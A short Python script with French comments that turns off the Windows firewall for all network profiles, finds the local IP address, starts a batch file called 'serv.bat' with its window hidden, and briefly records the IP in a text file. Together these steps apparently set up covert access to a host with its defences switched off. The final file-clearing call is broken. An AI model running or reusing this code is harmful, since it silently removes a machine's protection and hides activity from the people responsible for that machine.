import socket
import subprocess
import time


def disable_firewall():
    try:
        subprocess.run(["netsh", "advfirewall", "set", "allprofiles", "state", "off"], check=True)
        print("Le pare-feu a été désactivé avec succès.")
    except subprocess.CalledProcessError as e:
        print(f"Erreur lors de la désactivation du pare-feu : {e}")
        
def get_local_ip():
    try:
        # Crée une connexion UDP à un serveur quelconque
        temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        temp_socket.connect(('8.8.8.8', 80))  # Connexion à un serveur DNS arbitraire
        local_ip = temp_socket.getsockname()[0]  # Récupère l'adresse IP locale
        temp_socket.close()  # Ferme la connexion temporaire
        return local_ip
    except Exception as e:
        print(f"Erreur lors de la récupération de l'adresse IP locale : {e}")
        return None

local_ip = get_local_ip()
if local_ip:
    disable_firewall()
    print(f"Adresse IP locale trouvée : {local_ip}")
    
    # Démarrer le serveur HTTP en utilisant local_ip comme adresse IP
    chemin_fichier_batch = "serv.bat"
    subprocess.Popen([chemin_fichier_batch], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    with open("whereiam.txt", "a") as fichier:
        fichier.write(local_ip)
    time.sleep(3)
    with open("whereiam.txt", "w") as fichier:
        fichier.write()
else:
    print("Impossible de récupérer l'adresse IP locale.")
